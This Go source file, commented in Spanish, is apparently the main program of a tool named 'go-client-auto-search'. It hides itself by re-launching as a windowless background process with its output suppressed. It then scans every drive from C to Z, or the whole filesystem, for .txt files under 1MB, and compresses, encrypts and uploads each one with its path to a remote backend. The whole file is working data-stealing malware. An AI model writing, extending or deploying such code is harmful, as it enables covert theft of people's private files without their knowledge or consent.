package main

import (
	"fmt"
	"go-client-auto-search/internal/api"
	"go-client-auto-search/internal/compress"
	"go-client-auto-search/internal/encrypt"
	"go-client-auto-search/internal/search"
	"os"
	"os/exec"
	"runtime"
	"time"

	"golang.org/x/sys/windows"
)

const maxFileSize = 1 * 1024 * 1024 // 1MB
const checkInterval = 10 * time.Second

// GOOS=windows GOARCH=amd64 go build -o gosearch.exe cmd/main.go
// go build -ldflags="-H=windowsgui -s -w" -o gosearch.exe cmd/main.go

func main() {

	// Verificar si es el proceso hijo
	if len(os.Args) > 1 && os.Args[1] == "background" {
		fmt.Println("🛠️ Proceso en segundo plano ejecutándose...")

		// Verificar conexión a Internet y al backend
		for {
			if api.CheckBackendConnection() {
				break
			}
			fmt.Println("🌐 No hay conexión a Internet o al backend. Reintentando en " + checkInterval.String() + "...")
			time.Sleep(checkInterval)
		}

		if runtime.GOOS == "windows" {
			for drive := 'C'; drive <= 'Z'; drive++ {
				startDir := fmt.Sprintf("%c:\\", drive)
				fmt.Printf("🔍 Buscando archivos '.txt' en %s...\n", startDir)

				err := search.SearchFiles(startDir, ".txt", maxFileSize, processFile)
				if err != nil {
					fmt.Printf("❌ Error en la búsqueda de archivos en %s: %v\n", startDir, err)
				}
			}
		} else {
			startDir := "/"
			fmt.Println("🔍 Buscando archivos '.txt' en todo el sistema...")

			err := search.SearchFiles(startDir, ".txt", maxFileSize, processFile)
			if err != nil {
				fmt.Println("❌ Error en la búsqueda de archivos:", err)
			}
		}

		fmt.Println("✅ Búsqueda y envío completados.")
		fmt.Println("✅ Proceso en segundo plano finalizado.")
		return
	}

	// Iniciar un nuevo proceso en segundo plano
	cmd := exec.Command(os.Args[0], "background") // Reejecuta el mismo programa
	if runtime.GOOS == "windows" {
		// Usar STARTF_USESHOWWINDOW para ocultar la ventana en Windows
		cmd.SysProcAttr = &windows.SysProcAttr{
			CreationFlags: windows.CREATE_NO_WINDOW,
		}
	}
	cmd.Stdout = nil   // No muestra salida en la terminal
	cmd.Stderr = nil   // No muestra errores
	err := cmd.Start() // Inicia el proceso en segundo plano
	if err != nil {
		fmt.Println("❌ Error iniciando el proceso en segundo plano:", err)
		return
	}

	fmt.Printf("🚀 El proceso se ejecuta en segundo plano con PID %d. Cerrando la aplicación principal.\n", cmd.Process.Pid)
	os.Exit(0) // Cierra la aplicación principal inmediatamente
}

func processFile(path string, fileData []byte) error {
	// 🔄 Comprimir
	compressedData, err := compress.CompressData(fileData)
	if err != nil {
		fmt.Println("❌ Error comprimiendo el archivo:", err)
		return err
	}

	// 🔐 Encriptar
	encryptedData, err := encrypt.EncryptData(compressedData)
	if err != nil {
		fmt.Println("❌ Error encriptando el archivo:", err)
		return err
	}

	// 📤 Enviar
	err = api.SendToAPI(encryptedData, path)
	if err != nil {
		fmt.Println("❌ Error enviando el archivo:", err)
		return err
	}

	return nil
}
